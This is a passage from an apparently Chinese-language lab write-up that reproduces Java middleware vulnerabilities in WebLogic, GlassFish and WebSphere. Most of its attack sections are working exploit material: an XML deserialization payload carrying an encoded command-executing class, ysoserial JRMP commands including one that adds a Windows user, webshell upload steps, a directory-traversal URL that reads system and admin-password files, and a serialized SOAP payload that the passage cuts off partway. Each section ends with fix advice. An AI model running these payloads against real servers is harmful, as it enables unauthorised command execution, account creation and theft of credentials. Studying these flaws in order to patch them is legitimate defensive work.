&quot;weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n&quot;</span><br><span class="line">+ &quot;outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n&quot;</span><br><span class="line">+ &quot;outputStream.flush();\n&quot;</span><br><span class="line">+ &quot;response.getWriter().write(\&quot;\&quot;);&quot;</span><br><span class="line">+ &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>转换成XMl格式，参考lufei给出的，稍微改一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;class&gt;&lt;string&gt;org.slf4j.ext.EventData&lt;/string&gt;</span><br><span class="line">&lt;void&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;void class=&quot;sun.misc.BASE64Decoder&quot;&gt;</span><br><span class="line">&lt;void method=&quot;decodeBuffer&quot; id=&quot;byte_arr&quot;&gt; &lt;string&gt;yv66vgAAADIAXAoAGgArCAAsCgAtAC4KAAgALwgAMAoACAAxCgAyADMHADQIADUIADYKADIANwgAOAgAOQoAOgA7BwA8CgAPAD0HAD4KABEAPwgAQAoAEQBBBwBCCgAVACsKABUAQwoAFQBEBwBFBwBGAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADQHAEcHAEgHADwHAD4BAApFeGNlcHRpb25zBwBJAQAKU291cmNlRmlsZQEAE1Jlc3VsdEJhc2VFeGVjLmphdmEMABsAHAEAB29zLm5hbWUHAEoMAEsAIAwATABNAQADd2luDABOAE8HAFAMAFEAUgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAB8AUwEABy9iaW4vc2gBAAItYwcARwwAVABVAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAGwBWAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAGwBXAQAADABYAE0BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAWQBaDABbAE0BAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABkAGgAAAAAAAgABABsAHAABAB0AAAAdAAEAAQAAAAUqtwABsQAAAAEAHgAAAAYAAQAAAAMACQAfACAAAgAdAAABCwAFAAgAAACTEgK4AANMK8YAKyu2AAQSBbYABpkAH7gABwa9AAhZAxIJU1kEEgpTWQUqU7YAC02nABy4AAcGvQAIWQMSDFNZBBINU1kFKlO2AAtNLLYADk67AA9ZLbcAEDoEuwARWRkEtwASOgUBOgYSEzoHGQW2ABRZOgbGABy7ABVZtwAWGQe2ABcZBrYAF7YAGDoHp//fGQewAAAAAgAeAAAAMgAMAAAABQAGAAcAFgAJADIADABLAA4AUAAPAFoAEABlABEAaAASAGwAEwB3ABUAkAAXACEAAAAuAAT8ADIHACL8ABgHACP/ACAACAcAIgcAIgcAIwcAJAcAJQcAJgcAIgcAIgAAIwAnAAAABAABACgAAQApAAAAAgAq&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void class=&quot;org.mozilla.classfile.DefiningClassLoader&quot;&gt;</span><br><span class="line">&lt;void method=&quot;defineClass&quot;&gt;</span><br><span class="line">&lt;string&gt;ResultBaseExec&lt;/string&gt;</span><br><span class="line">&lt;object idref=&quot;byte_arr&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;void method=&quot;newInstance&quot;&gt;</span><br><span class="line">&lt;void method=&quot;exec&quot; id=&quot;result&quot;&gt;</span><br><span class="line">&lt;string&gt;whoami&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.Thread&quot; method=&quot;currentThread&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getCurrentWork&quot; id=&quot;current_work&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getClass&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getDeclaredField&quot;&gt;</span><br><span class="line">&lt;string&gt;connectionHandler&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;setAccessible&quot;&gt;&lt;boolean&gt;true&lt;/boolean&gt;&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;get&quot;&gt;</span><br><span class="line">&lt;object idref=&quot;current_work&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;void method=&quot;getServletRequest&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getResponse&quot;&gt;</span><br><span class="line">&lt;void method=&quot;getServletOutputStream&quot;&gt;</span><br><span class="line">&lt;void method=&quot;writeStream&quot;&gt;</span><br><span class="line">&lt;object class=&quot;weblogic.xml.util.StringInputStream&quot;&gt;&lt;object idref=&quot;result&quot;&gt;&lt;/object&gt;&lt;/object&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;flush&quot;/&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;getWriter&quot;&gt;&lt;void method=&quot;write&quot;&gt;&lt;string&gt;&lt;/string&gt;&lt;/void&gt;&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/class&gt;</span><br></pre></td></tr></table></figure>

<p>执行:</p>
<h3 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（反序列化命令执行漏洞（-CVE-2018-2628-））"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（反序列化命令执行漏洞（-CVE-2018-2628-））" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（反序列化命令执行漏洞（ CVE-2018-2628 ））"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（反序列化命令执行漏洞（ CVE-2018-2628 ））</h3><p>Weblogic Server WLS Core Components反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意<br>命令。</p>
<p>使用exploit.py脚本进行复现,具体使用方法见脚本。</p>
<p>Kail Attack ：192.168.31.232<br>Win03 victim : 192.168.124.130</p>
<p>Kail 执行<br>1 ）下载ysoserial.jar<br>wget <a href="https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar">https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</a></p>
<p>2 ）使用ysoserial.jar，启动JRMP Server</p>
<p>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]<br>其中，[command]是想执行的命令，而[listen port]是JRMP Server监听的端口。、<br>这里我执<br>行java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ‘net user xiaohao xiaohao &#x2F;add’</p>
<p>3 ）执行exploit.py<br>python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</p>
<p>其中，[victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地（Kail系统上的）ysoserial的路径，[JRMPListener ip]和[JRMPListener<br>port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2<br>这里我执行python2 exploit.py 192.168.124.130 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.31.232 1099 JRMPClient2</p>
<p>结果如下：</p>
<p>修复建议修复建议</p>
<p>1.过滤t3协议。<br>在域结构中点击 安全-&gt;筛选器<br>连接筛选器填: weblogic.security.net.ConnectionFilterImpl 保存后重启Weblogic.</p>
<p>kail再次攻击，Exp将报错。</p>
<p>连接筛选器规则可参考官方文档</p>
<p>2.安装补丁，但是保不准下一次Weblogic缝缝补补的黑名单又被绕过。</p>
<h3 id="Weblogic-任意文件上传漏洞（任意文件上传漏洞（-CVE-2018-2894-））"><a href="#Weblogic-任意文件上传漏洞（任意文件上传漏洞（-CVE-2018-2894-））" class="headerlink" title="Weblogic 任意文件上传漏洞（任意文件上传漏洞（ CVE-2018-2894 ））"></a>Weblogic 任意文件上传漏洞（任意文件上传漏洞（ CVE-2018-2894 ））</h3><p>Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在”生产模式”下默认不开启，所以该漏洞有一定限制。</p>
<p>影响版本：12.1.3.0, 12.2.1.2, 12.2.1.3</p>
<p>下载Weblogic 12.1.3.0</p>
<p>安装的时候将Weblogic放在Java JDK的bin目录下，防止出现因环境变量带空格导致的错误，安装过程一直点击下一步即可。</p>
<p>以下复现是在Weblogic开发模式下进行的，若需在生产模式下进行复现，则需要 登录后台页面，点击base_domain的配置，在”高级”设置中 开启 “启用 Web<br>服务测试页” 选项，经过我的验证发现开启之后，不仅需要账号密码登陆，即使登陆了也没有这两处上传点。</p>
<p>访问 ws_utc&#x2F;config.do，设置Work Home Dir为ws_utc应用的静态文件css目<br>录C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css，<br>因为访问这个目录是无需权限的，提交后，点击左侧 安全-&gt; 添加，然后上传Webshell。</p>
<p>点击提交并抓包，获取响应数据包中的时间戳。</p>
<p>然后访问 <a href="http://127.0.0.1:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8Cwebshell%EF%BC%9A">http://127.0.0.1:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell：</a></p>
<p>访问 ws_utc&#x2F;begin.do，点击右上角的文件夹，上传Webshell，点击提交，并抓包。</p>
<p>在返回数据包中得到Webshell路径。</p>
<p>然后访问<a href="http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2019-06-07_17-12-18_558/import_file_name_lxhspy.jsp">http://127.0.0.1:7001/ws_utc/css/upload/RS_Upload_2019-06-07_17-12-18_558/import_file_name_lxhspy.jsp</a></p>
<p>Note:<br>1 ） <strong>ws_utc&#x2F;begin.do</strong> 使用的工作目录是在使用的工作目录是在 <strong>ws_utc&#x2F;config.do</strong> 中设置的中设置的 <strong>Work Home Dir</strong> 。。<br>2 ）利用需要知道部署应用的web目录。<br>3 ）在生产模式下默认不开启，在后台开启之后，需要认证</p>
<p>修复建议修复建议</p>
<p>启动生产模式，<br>编辑domain路径下的setDomainEnv.cmd文件，将set PRODUCTION_MODE&#x3D; 更改为 set PRODUCTION_MODE&#x3D;true<br>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\bin\setDomainEnv.cmd<br>目前(2019&#x2F;06&#x2F;07) 生产模式下 已取消这两处上传文件的地方。</p>
<h3 id="Weblogic-SSRF-漏洞漏洞-（（-CVE-2014-4210-））"><a href="#Weblogic-SSRF-漏洞漏洞-（（-CVE-2014-4210-））" class="headerlink" title="Weblogic SSRF 漏洞漏洞 （（ CVE-2014-4210 ））"></a>Weblogic SSRF 漏洞漏洞 （（ CVE-2014-4210 ））</h3><p>影响版本：10.0.2.0, 10.3.6.0</p>
<p>访问 &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞，填写任意信息，如下</p>
<p>点击Search，并抓包，抓包之后在Burp中右键，选择Change request method, 将POST请求改变成GET。</p>
<p>参数operator为SSRF的可控参数，将其更改为开放的端口，如<a href="http://127.0.0.1:7001/%EF%BC%8C%E5%B0%86%E8%BF%94%E5%9B%9Eerror">http://127.0.0.1:7001/，将返回error</a> code</p>
<p>若开放端口为HTTP协议，则会返回did not have a valid SOAP content-type。</p>
<p>访问不存在的端口，将返回could not connect over HTTP to server</p>
<p>通过 返回数据包 中的错误信息，即可探测内网状态。</p>
<p>修复建议修复建议</p>
<p>删除SearchPublicRegistries.jsp文件或修改SearchPublicRegistries.jsp文件后缀为不解析后缀，如SearchPublicRegistries.jspxxx，后重启Weblogic，再次访<br>问，如下：</p>
<p>SearchPublicRegistries.jsp路径为：<br>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\uddiexplorer\5f6ebw\war</p>
<h3 id="Weblogic-弱口令弱口令-amp-amp-后台后台-getshell"><a href="#Weblogic-弱口令弱口令-amp-amp-后台后台-getshell" class="headerlink" title="Weblogic 弱口令弱口令 &amp;&amp; 后台后台 getshell"></a>Weblogic 弱口令弱口令 &amp;&amp; 后台后台 getshell</h3><p>弱口令参考：<a href="https://cirt.net/passwords?criteria=WebLogic">https://cirt.net/passwords?criteria=WebLogic</a></p>
<p>访问<a href="http://127.0.0.1:7001/console">http://127.0.0.1:7001/console</a></p>
<p>自动重定向到<a href="http://127.0.0.1:7001/console/login/LoginForm.jsp%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0%E3%80%82">http://127.0.0.1:7001/console/login/LoginForm.jsp，使用弱口令登陆后台。</a></p>
<p>点击部署，进一步点击右边的安装。</p>
<p>点击上载文件，</p>
<p>选择war包，点击下一步</p>
<p>上传完成以后选中你上传的文件,点击下一步</p>
<p>选中作为应用程序安装，点击下一步</p>
<p>然后直接点击完成即可</p>
<p>选用我们安装的应用，点击启动即可。</p>
<p>访问：<a href="http://ip:port/[war包名]/[包名内文件名]">http://ip:port/[war包名]/[包名内文件名]</a></p>
<p>修复建议修复建议</p>
<p>避免后台弱口令。</p>
<h2 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h2><p>GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码<br>以及 Oracle 贡献的 TopLink 持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。</p>
<p>默认端口： 8080 （Web应用端口，即网站内容）， 4848 （GlassFish管理中心）</p>
<p>默认返回的指纹信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server: GlassFish Server Open Source Edition 4.1.2</span><br><span class="line">X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition 4.1.2 Java/Oracle Corporation/1.8)</span><br></pre></td></tr></table></figure>

<p>下载4.1.2版本</p>
<p>解压后，进入glassfish&#x2F;bin目录下打开CMD窗口输入asadmin start-domain启动glassfish</p>
<p>asadmin stop-domain 停止glassfish</p>
<h3 id="GlassFish-Directory-Traversal-（（-CVE-2017-1000028-））"><a href="#GlassFish-Directory-Traversal-（（-CVE-2017-1000028-））" class="headerlink" title="GlassFish Directory Traversal （（ CVE-2017-1000028 ））"></a>GlassFish Directory Traversal （（ CVE-2017-1000028 ））</h3><p>java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的&#x2F;（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。</p>
<p>计算机指定了UTF8编码接收二进制并进行转义，当发现字节以 0 开头，表示这是一个标准ASCII字符，直接转义，当发现 110 开头，则取 2 个字节 去掉 110 模<br>板后转义。<br>UTF8编码模板如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字节数字节数 大小范围（十进制）大小范围（十进制） 字节字节 1 字节字节 2 字节字节 3 字节字节 4</span><br><span class="line">1 U + 0000~ U + 007F（0~127） 0xxxxxxx None None None</span><br><span class="line">2 U + 0080~ U + 07FF（128~2047） 110xxxxx 10xxxxxx None None</span><br><span class="line">3 U + 0800~ U + 0FFF（2048~65535） 1110xxxx 10xxxxxx 10xxxxxx None</span><br><span class="line">4 U + 10000 ~ U + 10FFFF(65536~1114111) 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure>

<p>C0AF 转换位二进制为 110 00000 10 101111 ， 110 开头去掉摸板后为00000 101111 转换为 10 进制为 47 ，ASSCI为&#x2F;.</p>
<p>受影响版本：&lt;&#x3D;4.1.2版本</p>
<p>启动GlassFish后 ，访问<br><a href="http://your-ip:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini">http://your-ip:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</a>,<br>发现成功读取win.ini文件。</p>
<p>Note:如果在你的机器上不能成功读取，请自行添加如果在你的机器上不能成功读取，请自行添加 <strong>..%c0%af</strong></p>
<p>读admin-keyfile文件，该文件是储存admin账号密码的文件,爆破。<br>位置在glassfish&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-keyfile</p>
<p>修复建议修复建议</p>
<p>升级GlassFish最新版本。</p>
<h3 id="GlassFish-后台后台-Getshell"><a href="#GlassFish-后台后台-Getshell" class="headerlink" title="GlassFish 后台后台 Getshell"></a>GlassFish 后台后台 Getshell</h3><p>进入后台后 Applications，右边的deploy</p>
<p>选中war包后上传，填写Context Root 这个关系到你访问的url，点击Ok。</p>
<p>访问<a href="http://127.0.0.1:8080/[Context">http://127.0.0.1:8080/[Context</a> Root]&#x2F;[war包内的filename]</p>
<p>Note: 如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。 <strong>Configuration Error Secure Admin must be enabled to access<br>the DAS remotely</strong></p>
<p>修复建议修复建议</p>
<p>1.不开放后台给外网，<br>2.若开放 密码强度需设置 包含 大写字母，小写字母，数字，特殊字符，且长度大于 10 位。</p>
<h2 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h2><p>WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验。从基于开放标准的丰<br>富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。</p>
<p>下载安装7.0 WebSphere</p>
<p>指纹:<br>Server: WebSphere Application Server&#x2F;7.0</p>
<p>登录页面：<br><a href="http://127.0.0.1:9060/ibm/console/logon.jsp">http://127.0.0.1:9060/ibm/console/logon.jsp</a><br><a href="https://127.0.0.1:9043/ibm/console/logon.jsp">https://127.0.0.1:9043/ibm/console/logon.jsp</a></p>
<h3 id="Java-反序列化反序列化-CVE-2015-7450-））"><a href="#Java-反序列化反序列化-CVE-2015-7450-））" class="headerlink" title="Java 反序列化反序列化 (CVE-2015-7450 ））"></a>Java 反序列化反序列化 (CVE-2015-7450 ））</h3><p>访问 8880 端口，出现如下界面，则可能存在Java反序列化漏洞</p>
<p>访问 8880 ，并抓包，然后替换如下Payload进行复现，注意更改下Host.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.31.12:8880</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">SOAPAction: urn:AdminService</span><br><span class="line">Content-Length: 8886</span><br><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Header ns0:JMXConnectorContext=&quot;rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwS